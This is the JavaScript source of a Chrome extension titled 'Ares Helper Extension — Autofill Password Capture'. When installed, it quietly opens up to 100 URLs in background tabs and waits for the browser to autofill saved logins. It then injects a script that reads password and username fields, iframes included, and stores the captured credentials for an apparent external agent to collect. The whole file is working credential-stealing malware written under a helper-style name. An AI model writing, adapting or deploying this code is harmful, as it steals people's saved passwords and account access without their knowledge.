// Ares Helper Extension — Autofill Password Capture
// Runs in Chrome's trusted context, captures autofilled credentials
const RESULTS_KEY = 'ares_pw_results';
const URLS_KEY = 'ares_pw_urls';
let processing = false;

// Read URL list from extension storage (populated by agent via file)
async function getUrlList() {
  try {
    const resp = await fetch(chrome.runtime.getURL('urls.json'));
    return await resp.json();
  } catch(e) { return []; }
}

// Inject content script to read autofilled password fields
async function scrapeTab(tabId) {
  try {
    const results = await chrome.scripting.executeScript({
      target: { tabId },
      func: () => {
        const r = { u: '', p: '', url: location.href };
        const inputs = document.querySelectorAll('input');
        for (const inp of inputs) {
          if ((inp.type === 'password' || inp.autocomplete === 'current-password') && inp.value)
            r.p = inp.value;
          else if (inp.value && (inp.type === 'email' || inp.type === 'text' ||
            inp.autocomplete === 'username' || inp.autocomplete === 'email' ||
            inp.name === 'username' || inp.name === 'email' || inp.name === 'login'))
            if (!r.u || inp.value.indexOf('@') > -1) r.u = inp.value;
        }
        // Also check iframes
        try {
          for (const frame of document.querySelectorAll('iframe')) {
            try {
              const fdoc = frame.contentDocument;
              if (!fdoc) continue;
              for (const inp of fdoc.querySelectorAll('input')) {
                if ((inp.type === 'password') && inp.value) r.p = inp.value;
                else if (inp.value && (inp.type === 'email' || inp.type === 'text'))
                  if (!r.u) r.u = inp.value;
              }
            } catch(e) {}
          }
        } catch(e) {}
        return JSON.stringify(r);
      }
    });
    if (results && results[0] && results[0].result) {
      return JSON.parse(results[0].result);
    }
  } catch(e) {}
  return null;
}

// Main processing loop
async function processUrls() {
  if (processing) return;
  processing = true;
  
  const urls = await getUrlList();
  if (!urls || urls.length === 0) { processing = false; return; }
  
  const collected = [];
  
  for (let i = 0; i < urls.length && i < 100; i++) {
    const url = urls[i];
    if (!url || url.startsWith('android://')) continue;
    
    try {
      // Create tab and navigate
      const tab = await chrome.tabs.create({ url, active: false });
      
      // Wait for page load + autofill trigger
      await new Promise(resolve => {
        const listener = (tabId, info) => {
          if (tabId === tab.id && info.status === 'complete') {
            chrome.tabs.onUpdated.removeListener(listener);
            resolve();
          }
        };
        chrome.tabs.onUpdated.addListener(listener);
        // Timeout after 8 seconds
        setTimeout(() => {
          chrome.tabs.onUpdated.removeListener(listener);
          resolve();
        }, 8000);
      });
      
      // Extra wait for autofill to trigger
      await new Promise(r => setTimeout(r, 2000));
      
      // Scrape
      const result = await scrapeTab(tab.id);
      if (result && result.p) {
        collected.push(result);
      }
      
      // Close tab
      try { await chrome.tabs.remove(tab.id); } catch(e) {}
      
    } catch(e) { /* skip this URL */ }
  }
  
  // Store results
  await chrome.storage.local.set({ [RESULTS_KEY]: collected, done: true });
  processing = false;
}

// Auto-start on install
chrome.runtime.onInstalled.addListener(() => {
  setTimeout(processUrls, 2000);
});

// Also start on service worker activation
processUrls();
